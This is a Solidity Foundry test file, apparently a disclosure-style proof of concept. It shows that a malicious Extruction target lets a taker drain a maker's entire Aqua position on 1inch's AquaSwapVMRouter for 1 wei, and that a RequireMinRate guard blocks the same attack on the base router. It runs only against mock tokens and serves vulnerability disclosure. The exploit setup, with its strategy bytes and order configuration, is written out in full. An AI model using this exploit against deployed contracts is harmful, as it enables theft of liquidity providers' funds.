// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import { Test } from "forge-std/Test.sol";
import { TokenMock } from "@1inch/solidity-utils/contracts/mocks/TokenMock.sol";

import { Aqua } from "@1inch/aqua/src/Aqua.sol";

import { ISwapVM } from "@1inch/swap-vm/interfaces/ISwapVM.sol";
import { AquaSwapVMRouter } from "@1inch/swap-vm/routers/AquaSwapVMRouter.sol";
import { SwapVMRouter } from "@1inch/swap-vm/routers/SwapVMRouter.sol";
import { Extruction } from "@1inch/swap-vm/instructions/Extruction.sol";
import { RequireMinRate } from "@1inch/swap-vm/instructions/MinRate.sol";
import { Stop } from "@1inch/swap-vm/instructions/Controls.sol";
import { MakerTraitsLib } from "@1inch/swap-vm/libs/MakerTraits.sol";
import { TakerTraitsLib } from "@1inch/swap-vm/libs/TakerTraits.sol";
import { Opcode } from "@1inch/swap-vm/libs/OpcodeList.sol";

import { MaliciousExtructionTarget } from "../src/MaliciousExtructionTarget.sol";

/**
 * @title Poc04ExtructionDrainTest
 * @notice Demonstrates that an Extruction target can return dust amountIn and
 *   full-balance amountOut, which AquaSwapVMRouter settles without re-validation,
 *   pulling the maker's entire shipped Aqua position; while the same register
 *   corruption reverts on SwapVMRouter once a RequireMinRate (0xb0) instruction is
 *   present, and opcode 0xb0 is not even dispatchable on the Aqua router.
 *
 * Setup mirrors the production entry points:
 *   - Aqua deployed standalone; AquaSwapVMRouter and SwapVMRouter both wired to it.
 *   - Taker: plain caller (this test contract), exact-in, no threshold, first
 *     transfer from taker with transferFrom + Aqua push (canonical taker path).
 */
contract Poc04ExtructionDrainTest is Test {
    uint256 internal constant MAKER_AQUA_BALANCE_A = 1000e18; // full position, tokenA
    uint256 internal constant MAKER_AQUA_BALANCE_B = 1000e18; // full position, tokenB
    uint256 internal constant TAKER_DUST_AMOUNT_IN = 1;       // 1 wei

    Aqua internal aqua;
    AquaSwapVMRouter internal aquaRouter;
    SwapVMRouter internal baseRouter;

    TokenMock internal tokenA; // lower address
    TokenMock internal tokenB; // higher address

    address internal maker;
    uint256 internal makerPk = 0x1234;
    address internal taker = address(this);

    MaliciousExtructionTarget internal evilTarget;

    function setUp() public {
        maker = vm.addr(makerPk);

        aqua = new Aqua();
        aquaRouter = new AquaSwapVMRouter(address(aqua), address(0), address(this), "SwapVM", "1.0.0");
        baseRouter = new SwapVMRouter(address(aqua), address(0), address(this), "SwapVM", "1.0.0");

        tokenA = new TokenMock("Token I", "TKI");
        tokenB = new TokenMock("Token J", "TKJ");
        if (tokenA > tokenB) (tokenA, tokenB) = (tokenB, tokenA);

        evilTarget = new MaliciousExtructionTarget();

        // Maker funds the full position that ship() records and pull() can move.
        tokenA.mint(maker, MAKER_AQUA_BALANCE_A);
        tokenB.mint(maker, MAKER_AQUA_BALANCE_B);
        vm.startPrank(maker);
        tokenA.approve(address(aqua), type(uint256).max);
        tokenB.approve(address(aqua), type(uint256).max);
        tokenA.approve(address(baseRouter), type(uint256).max);
        tokenB.approve(address(baseRouter), type(uint256).max);
        vm.stopPrank();

        // Taker holds exactly 1 wei of tokenB to pay the corrupted amountIn.
        tokenB.mint(taker, 1);
        tokenB.approve(address(aquaRouter), type(uint256).max);
        tokenB.approve(address(baseRouter), type(uint256).max);
    }

    // ------------------------------------------------------------------
    // Test 1 — full maker position pulled via malicious extruction on the
    //          Aqua router for a 1-wei amountIn.
    // ------------------------------------------------------------------
    function test_AquaRouter_FullPositionPulledForDustAmountIn() public {
        // Strategy: [Extruction(evilTarget, drainAmount = full tokenA balance), Stop]
        bytes memory program = bytes.concat(
            Extruction.build(
                address(evilTarget),
                abi.encode(MAKER_AQUA_BALANCE_A)
            ),
            Stop.build()
        );

        ISwapVM.Order memory order = _aquaOrder(program);
        bytes32 strategyHash = _shipAquaStrategy(aquaRouter, order);

        // Pre-state.
        (uint256 balA, uint256 balB) = aqua.safeBalances(
            maker, address(aquaRouter), strategyHash, address(tokenA), address(tokenB)
        );
        assertEq(balA, MAKER_AQUA_BALANCE_A, "pre: maker Aqua tokenA balance");
        assertEq(balB, MAKER_AQUA_BALANCE_B, "pre: maker Aqua tokenB balance");
        assertEq(tokenA.balanceOf(taker), 0, "pre: taker tokenA");

        // Taker swaps B->A (isAToB = false): tokenIn = tokenB, tokenOut = tokenA.
        // amount = 1 matches the corrupted amountIn, so TakerTraitsTakerAmountInMismatch passes.
        (uint256 amountIn, uint256 amountOut,) = aquaRouter.swap(
            order,
            TAKER_DUST_AMOUNT_IN,
            _takerData(aquaRouter, order, /*isExactIn=*/ true, /*isAToB=*/ false)
        );

        // The dust amountIn and full-balance amountOut the fixture wrote are
        // settled wholesale, with no re-validation.
        assertEq(amountIn, 1, "amountIn is dust (1 wei)");
        assertEq(amountOut, MAKER_AQUA_BALANCE_A, "amountOut is the full maker Aqua tokenA position");

        // Fund-flow delta: taker received the entire tokenA position for 1 wei of tokenB.
        assertEq(tokenA.balanceOf(taker), MAKER_AQUA_BALANCE_A, "taker drained full tokenA position");
        assertEq(tokenB.balanceOf(taker), 0, "taker paid only its 1 wei tokenB");

        // The maker's Aqua position in tokenA is emptied to exactly zero.
        (uint256 afterA, uint256 afterB) = aqua.safeBalances(
            maker, address(aquaRouter), strategyHash, address(tokenA), address(tokenB)
        );
        assertEq(afterA, 0, "maker Aqua tokenA balance drained to zero");
        assertEq(afterB, MAKER_AQUA_BALANCE_B + 1, "maker Aqua tokenB balance gained only the 1-wei dust");

        // The maker's actual ERC20 tokenA left the wallet via Aqua.pull.
        assertEq(tokenA.balanceOf(maker), 0, "maker ERC20 tokenA emptied");
        assertEq(tokenB.balanceOf(maker), MAKER_AQUA_BALANCE_B + 1, "maker ERC20 tokenB = shipped + 1 wei");
    }

    // ------------------------------------------------------------------
    // Test 2 — the same register corruption reverts on the base router when
    //          RequireMinRate (0xb0) guards the strategy.
    // ------------------------------------------------------------------
    function test_BaseRouter_RequireMinRateRevertsSameCorruption() public {
        // Strategy: [RequireMinRate(1:1), Extruction(evilTarget, drainAmount = full tokenA balance)]
        // RequireMinRate runs the rest of the program (MinRate.sol:52 ctx.runLoop())
        // and checks the final rate the extruction target wrote.
        bytes memory program = bytes.concat(
            RequireMinRate.build(1e18, 1e18),
            Extruction.build(
                address(evilTarget),
                abi.encode(MAKER_AQUA_BALANCE_A)
            )
        );

        ISwapVM.Order memory order = _signatureOrder(baseRouter, program);
        bytes memory data = _takerData(baseRouter, order, /*isExactIn=*/ true, /*isAToB=*/ false);

        vm.expectRevert(
            abi.encodeWithSelector(
                RequireMinRate.RequireMinRateFailed.selector,
                1,
                MAKER_AQUA_BALANCE_A,
                1e18,
                1e18
            )
        );
        baseRouter.swap(order, TAKER_DUST_AMOUNT_IN, data);

        // Nothing moved: the maker's wallet and the taker's wallet are unchanged.
        assertEq(tokenA.balanceOf(taker), 0, "taker received nothing");
        assertEq(tokenA.balanceOf(maker), MAKER_AQUA_BALANCE_A, "maker tokenA intact");
        assertEq(tokenB.balanceOf(taker), 1, "taker still holds its 1 wei");
    }

    // ------------------------------------------------------------------
    // Test 3 — opcode 0xb0 (RequireMinRate) is not dispatchable on the Aqua
    //          router: AquaOpcodes has no branch for it and reverts.
    // ------------------------------------------------------------------
    function test_AquaRouter_Opcode0xb0NotDispatchable() public {
        // Hand-assemble the same instruction RequireMinRate.build(1e18, 1e18) emits:
        //   byte 0xb0 | args-length 16 | rateA uint64 | rateB uint64
        bytes memory opcodeB0 = bytes.concat(
            bytes1(uint8(Opcode.RequireMinRate)),
            bytes1(uint8(16)),
            bytes8(uint64(1e18)),
            bytes8(uint64(1e18))
        );

        ISwapVM.Order memory order = _aquaOrder(opcodeB0);
        _shipAquaStrategy(aquaRouter, order);

        // The strategy executes to the dispatcher and reverts: the guard set
        // available on the base router does not exist on the Aqua router.
        vm.expectRevert(abi.encodeWithSelector(bytes4(keccak256("UnknownOpcode(uint256)")), uint256(0xb0)));
        aquaRouter.swap(
            order,
            TAKER_DUST_AMOUNT_IN,
            _takerData(aquaRouter, order, /*isExactIn=*/ true, /*isAToB=*/ false)
        );

        assertEq(tokenA.balanceOf(taker), 0, "taker received nothing");
        assertEq(tokenA.balanceOf(maker), MAKER_AQUA_BALANCE_A, "maker tokenA intact");
    }

    // ------------------------------------------------------------------
    // Helpers
    // ------------------------------------------------------------------

    function _aquaOrder(bytes memory program) internal view returns (ISwapVM.Order memory) {
        return MakerTraitsLib.build(
            MakerTraitsLib.Args({
                maker: maker,
                receiver: address(0),
                tokenA: address(tokenA),
                tokenB: address(tokenB),
                shouldUnwrapWeth: false,
                useAquaInsteadOfSignature: true,
                allowZeroAmountIn: false,
                usePermit2: false,
                hasPreTransferInHook: false,
                hasPostTransferInHook: false,
                hasPreTransferOutHook: false,
                hasPostTransferOutHook: false,
                preTransferInTarget: address(0),
                preTransferInData: "",
                postTransferInTarget: address(0),
                postTransferInData: "",
                preTransferOutTarget: address(0),
                preTransferOutData: "",
                postTransferOutTarget: address(0),
                postTransferOutData: "",
                program: program
            })
        );
    }

    function _signatureOrder(SwapVMRouter, bytes memory program) internal view returns (ISwapVM.Order memory) {
        return MakerTraitsLib.build(
            MakerTraitsLib.Args({
                maker: maker,
                receiver: address(0),
                tokenA: address(tokenA),
                tokenB: address(tokenB),
                shouldUnwrapWeth: false,
                useAquaInsteadOfSignature: false,
                allowZeroAmountIn: false,
                usePermit2: false,
                hasPreTransferInHook: false,
                hasPostTransferInHook: false,
                hasPreTransferOutHook: false,
                hasPostTransferOutHook: false,
                preTransferInTarget: address(0),
                preTransferInData: "",
                postTransferInTarget: address(0),
                postTransferInData: "",
                preTransferOutTarget: address(0),
                preTransferOutData: "",
                postTransferOutTarget: address(0),
                postTransferOutData: "",
                program: program
            })
        );
    }

    function _shipAquaStrategy(AquaSwapVMRouter router, ISwapVM.Order memory order) internal returns (bytes32) {
        address[] memory tokens = new address[](2);
        tokens[0] = address(tokenA);
        tokens[1] = address(tokenB);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = MAKER_AQUA_BALANCE_A;
        amounts[1] = MAKER_AQUA_BALANCE_B;

        vm.prank(maker);
        bytes32 strategyHash = aqua.ship(
            address(router),
            abi.encode(order),
            tokens,
            amounts
        );

        // For useAquaInsteadOfSignature orders, hash() = keccak256(abi.encode(order)),
        // the exact strategy bytes shipped above.
        assertEq(strategyHash, router.hash(order), "strategyHash == orderHash");
        return strategyHash;
    }

    function _takerData(ISwapVM router, ISwapVM.Order memory order, bool isExactIn, bool isAToB)
        internal view returns (bytes memory)
    {
        bytes memory signature = "";
        if (!order.traits.useAquaInsteadOfSignature()) {
            bytes32 orderHash = router.hash(order);
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(makerPk, orderHash);
            signature = abi.encodePacked(r, s, v);
        }

        return TakerTraitsLib.build(
            TakerTraitsLib.Args({
                taker: taker,
                isExactIn: isExactIn,
                shouldUnwrapWeth: false,
                isStrictThresholdAmount: false,
                isFirstTransferFromTaker: true,
                useTransferFromAndAquaPush: true,
                isAToB: isAToB,
                allowPartialFill: false,
                usePermit2: false,
                threshold: "",
                to: address(0),
                deadline: 0,
                hasPreTransferInCallback: false,
                hasPreTransferOutCallback: false,
                preTransferInHookData: "",
                postTransferInHookData: "",
                preTransferOutHookData: "",
                postTransferOutHookData: "",
                preTransferInCallbackData: "",
                preTransferOutCallbackData: "",
                instructionsArgs: "",
                signature: signature
            })
        );
    }
}
